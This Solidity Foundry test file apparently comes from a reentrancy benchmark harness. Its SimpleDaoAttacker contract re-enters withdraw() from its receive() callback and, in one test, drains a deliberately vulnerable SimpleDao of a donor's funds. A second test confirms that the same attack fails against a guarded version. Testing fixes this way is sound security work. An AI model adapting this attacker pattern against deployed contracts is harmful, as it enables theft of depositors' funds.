// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {SimpleDao} from "../src/SimpleDao.sol";
import {SimpleDaoFixed} from "../src/SimpleDaoFixed.sol";

/// @title Differential fixture for the SimpleDAO reentrancy harness
/// @notice PROVENANCE: dataset/reentrancy/simple_dao.sol (vulnerable line 19).
///         Actors are separated deliberately (attacker / victim / protocol):
///         the victim is an unrelated donor, the attacker re-enters from its
///         receive() callback, the protocol is the DAO under test.
contract SimpleDaoAttacker {
    SimpleDao public immutable dao;
    uint256 public reentries;
    uint256 public maxReentries;

    constructor(address dao_) {
        dao = SimpleDao(dao_);
    }

    function attack(uint256 maxReentries_) external payable {
        maxReentries = maxReentries_;
        dao.donate{value: msg.value}(address(this));
        dao.withdraw(msg.value);
    }

    receive() external payable {
        if (reentries < maxReentries) {
            reentries += 1;
            dao.withdraw(1 ether);
        }
    }
}

contract SimpleDaoFixtureTest is Test {
    function test_fixtureReproducesReentrancy() public {
        SimpleDao dao = new SimpleDao();

        // VICTIM: an unrelated donor, so the pool holds more than the stake.
        address victimEOA = makeAddr("victimEOA");
        vm.deal(victimEOA, 10 ether);
        vm.prank(victimEOA);
        dao.donate{value: 5 ether}(victimEOA);

        // ATTACKER: 1 ether stake against a 6 ether pool.
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);
        SimpleDaoAttacker attacker = new SimpleDaoAttacker(address(dao));

        vm.prank(attackerEOA);
        attacker.attack{value: 1 ether}(5);

        uint256 attackerGain = address(attacker).balance;
        console.log("attacker contract balance:", attackerGain);
        console.log("re-entries:", attacker.reentries());

        // Walking away with MORE than the 1 ether stake is the reproduction.
        assertGt(attackerGain, 1 ether, "fixture did not reproduce: gain <= stake");
        assertEq(address(dao).balance, 0, "pool not drained");
    }

    function test_fixtureDoesNotReproduceOnFixedContract() public {
        SimpleDaoFixed dao = new SimpleDaoFixed();

        address victimEOA = makeAddr("victimEOA");
        vm.deal(victimEOA, 10 ether);
        vm.prank(victimEOA);
        dao.donate{value: 5 ether}(victimEOA);

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);
        SimpleDaoFixedAttacker attacker = new SimpleDaoFixedAttacker(address(dao));

        uint256 poolBefore = address(dao).balance;

        // Low-level call so the expected revert does not fail the test itself.
        vm.prank(attackerEOA);
        (bool ok, ) = address(attacker).call{value: 1 ether}(
            abi.encodeWithSignature("attack()")
        );

        uint256 drained = poolBefore - address(dao).balance;
        console.log("fixed: attack succeeded?", ok);
        console.log("fixed: drained", drained);

        // The re-entrant withdraw reverts on the guard, so the attacker's own
        // withdrawal reverts with it and the pool is untouched.
        assertFalse(ok, "the re-entrant withdrawal should have reverted on the guard");
        assertEq(drained, 0, "a fixed contract must not lose value to this harness");
        assertEq(address(dao).balance, 5 ether, "victim funds must be retained");
    }
}

/// @dev The same attacker shape against the fixed DAO: it really does try to
///      re-enter, so the guard is exercised rather than assumed.
contract SimpleDaoFixedAttacker {
    SimpleDaoFixed public immutable dao;
    uint256 public reentries;

    constructor(address dao_) {
        dao = SimpleDaoFixed(dao_);
    }

    function attack() external payable {
        dao.donate{value: msg.value}(address(this));
        dao.withdraw(msg.value);
    }

    receive() external payable {
        reentries += 1;
        dao.withdraw(1 ether);
    }
}
